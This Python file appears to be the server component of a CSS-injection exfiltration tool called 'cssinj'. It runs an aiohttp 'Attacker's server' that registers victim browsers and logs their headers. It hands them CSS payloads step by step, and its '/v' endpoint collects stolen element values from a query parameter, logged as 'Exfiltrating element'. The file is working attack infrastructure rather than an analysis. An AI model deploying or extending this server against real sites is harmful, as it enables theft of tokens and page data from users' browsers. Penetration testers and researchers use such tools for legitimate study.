import asyncio
import contextlib
import signal

from aiohttp import web

from cssinj.client import Client
from cssinj.console import Console, LogLevel
from cssinj.strategies import get_strategy
from cssinj.utils.error import InjectionError


class Server:
    def __init__(self, clients, args, output_file):
        self.hostname = args.hostname
        self.port = args.port
        self.element = args.element
        self.attribut = args.attribut
        self.show_details = args.details
        self.clients = clients
        self.output_file = output_file
        self.app = web.Application(middlewares=[self.error_middleware, self.dynamic_router_middleware])

        # Instantiate the strategy
        StrategyClass = get_strategy(args.method)
        self.strategy = StrategyClass(
            hostname=self.hostname,
            port=self.port,
            element=self.element,
            attribut=self.attribut,
            timeout=getattr(args, 'timeout', 3.0),
        )

    async def run(self) -> None:
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        site = web.TCPSite(self.runner, self.hostname, self.port)
        await site.start()
        Console.log(LogLevel.SERVER, f"Attacker's server started on {self.hostname}:{self.port}")

        stop_event = asyncio.Event()
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            with contextlib.suppress(NotImplementedError):
                loop.add_signal_handler(sig, stop_event.set)
        try:
            await stop_event.wait()
        finally:
            await self.stop()

    async def stop(self) -> None:
        Console.log(LogLevel.SERVER, "Attacker's server cleaning up.")
        if self.runner is not None:
            await self.runner.cleanup()
        Console.log(LogLevel.SERVER, "Attacker's server stopped.")

    async def handle_start(self, request):
        client = self.clients.register(
            Client(
                host=request.remote,
                accept=request.get('accept'),
                headers=dict(request.headers),
                event=asyncio.Event(),
            ),
        )
        if self.output_file:
            self.output_file.update()
        Console.log(LogLevel.CONNECTION, f'Connection from {client.host}')
        Console.log(LogLevel.CONNECTION_DETAILS, f'ID : {client.id}')
        client.event.set()

        if self.show_details:
            for key, value in request.headers.items():
                Console.log(LogLevel.CONNECTION_DETAILS, f'{key} : {value}')

        return web.Response(
            text=self.strategy.generate_start_payload(client),
            content_type='text/css',
        )

    async def handle_end(self, request):
        client = self._get_client(request)
        body = self.strategy.handle_end(client)
        if self.output_file:
            self.output_file.update()
        client.event.set()
        return web.Response(text=body, content_type='text/css')

    async def handle_next(self, request):
        client = self._get_client(request)

        client.counter += 1

        await client.event.wait()

        client.event.clear()

        return web.Response(
            text=self.strategy.generate_next_payload(client),
            content_type='text/css',
        )

    async def handle_valid(self, request):
        client = self._get_client(request)
        data = request.query.get('t')

        client.event.set()

        self.strategy.handle_valid(client, data)

        if self.output_file:
            self.output_file.update()

        if self.show_details:
            Console.log(
                LogLevel.EXFILTRATION,
                f'[{client.id}] - Exfiltrating element: {data}',
            )

        return web.Response(text='ok', content_type='text/css')

    async def dynamic_router_middleware(self, app, handler):
        async def middleware_handler(request):
            path = request.path

            if path.startswith('/start'):
                return await self.handle_start(request)
            if path.startswith('/n'):
                return await self.handle_next(request)
            if path.startswith('/v'):
                return await self.handle_valid(request)
            if path.startswith('/e'):
                return await self.handle_end(request)
            return web.Response(text='404: Not Found', status=404)

        return middleware_handler

    @web.middleware
    async def error_middleware(self, request, handler):
        try:
            response = await handler(request)
            return response
        except Exception as ex:
            Console.error_handler(ex, context={'source': 'middleware'})
            return web.Response(text='500: Internal Server Error', status=500)

    def _get_client(self, request) -> Client:
        client = self.clients.get_by_id(request.query.get('cid'))
        if client is None:
            raise InjectionError('Unknown client id')
        return client
